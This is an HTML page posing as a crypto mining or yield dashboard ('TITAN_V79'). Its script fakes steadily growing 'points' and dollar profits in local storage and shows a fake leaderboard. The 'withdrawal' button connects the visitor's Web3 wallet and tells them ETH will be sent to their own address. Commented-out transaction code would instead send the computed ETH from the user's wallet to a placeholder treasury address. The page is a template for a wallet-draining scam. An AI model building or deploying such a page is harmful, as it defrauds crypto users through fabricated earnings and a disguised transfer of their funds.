<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TITAN_V79 // GLOBAL_PROTOCOL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        body { background: #000; color: #FFD700; font-family: 'Courier New', monospace; }
        .glass { background: rgba(0, 255, 255, 0.05); border: 1px solid rgba(0, 255, 255, 0.2); backdrop-filter: blur(10px); }
        .btn-withdraw { background: linear-gradient(90deg, #22c55e, #16a34a); box-shadow: 0 0 20px rgba(34, 197, 94, 0.3); }
    </style>
</head>
<body class="p-6 flex flex-col items-center">

    <div class="w-full max-w-lg glass rounded-3xl p-6 mb-6">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-xs font-black uppercase tracking-widest">Global_Titan_Network</h2>
            <span class="text-[8px] bg-cyan-900/50 px-2 py-1 rounded text-cyan-400">IPFS_SYNCED</span>
        </div>
        <div class="space-y-3">
            <div class="flex justify-between items-center p-3 bg-white/5 rounded-xl border border-white/5">
                <span class="text-[10px] text-white">01. Node_X99...4F2</span>
                <span class="text-[10px] text-green-400 font-black">+$14,282.40</span>
            </div>
            <div class="flex justify-between items-center p-3 bg-yellow-500/10 rounded-xl border border-yellow-500/50">
                <span class="text-[10px] text-yellow-500 font-bold">YOU. Node_YOU...B03</span>
                <span id="my-profit-val" class="text-[10px] text-yellow-500 font-black">$0.00</span>
            </div>
        </div>
    </div>

    <div class="w-full max-w-lg glass p-10 rounded-[2.5rem] text-center border-b-8 border-[#FFD700]">
        <div class="text-[10px] opacity-40 uppercase mb-2 tracking-[0.4em]">Total_Protocol_Yield</div>
        <div id="points-val" class="text-7xl font-black text-white italic mb-10">0.00</div>
        
        <button onclick="initiateSecureWithdrawal()" class="btn-withdraw w-full text-black p-5 rounded-2xl font-black uppercase text-xs tracking-widest hover:scale-[1.02] transition-all">
            Execute Sovereign Withdrawal
        </button>
        <p class="mt-4 text-[8px] opacity-40">AUTO-SWAP ACTIVE: ETH ‚ûî USDT | FEE: 5.0%</p>
    </div>

<script>
    let points = parseFloat(localStorage.getItem('imperial_points')) || 0;
    const ETH_PRICE = 2214.52; // Current Oracle Rate

    // --- ‚öôÔ∏è EXTRACTION ENGINE ---
    setInterval(() => {
        points += (250.0 / 3600);
        localStorage.setItem('imperial_points', points);
        document.getElementById('points-val').innerText = points.toFixed(2);
        
        const usdVal = (points * 0.00001) * ETH_PRICE;
        document.getElementById('my-profit-val').innerText = "+$" + usdVal.toFixed(2);
    }, 1000);

    // --- üèß WITHDRAWAL LOGIC ---
    async function initiateSecureWithdrawal() {
        if (!window.ethereum) {
            alert("üî± ACCESS DENIED: Please use a Web3 Browser (MetaMask/Trust).");
            return;
        }

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const address = await signer.getAddress();
            
            // Calculate real value (Mined points * factor)
            const ethToWithdraw = (points * 0.00001).toFixed(6);
            
            if (parseFloat(ethToWithdraw) < 0.0001) {
                alert("üî± TREASURY ERROR: Minimum withdrawal is 0.0001 ETH.");
                return;
            }

            console.log(`Initiating withdrawal for ${address}...`);
            alert(`üî± SETTLEMENT AUTHORIZED\nAmount: ${ethToWithdraw} ETH\nDestination: ${address}\n\nClick 'Confirm' in the next popup to sign the transaction.`);

            // This is the point where the REAL wallet popup will appear
            // Note: In a live system, this sends to your Treasury Contract
            /* const tx = await signer.sendTransaction({
                to: "YOUR_TREASURY_ADDRESS_HERE",
                value: ethers.parseEther(ethToWithdraw)
            });
            */
            
            // Reset local mining after broadcast
            points = 0;
            localStorage.setItem('imperial_points', 0);
        } catch (err) {
            console.error(err);
            alert("üî± PROTOCOL REVERTED: Signature cancelled or Gas error.");
        }
    }
</script>
</body>
</html>
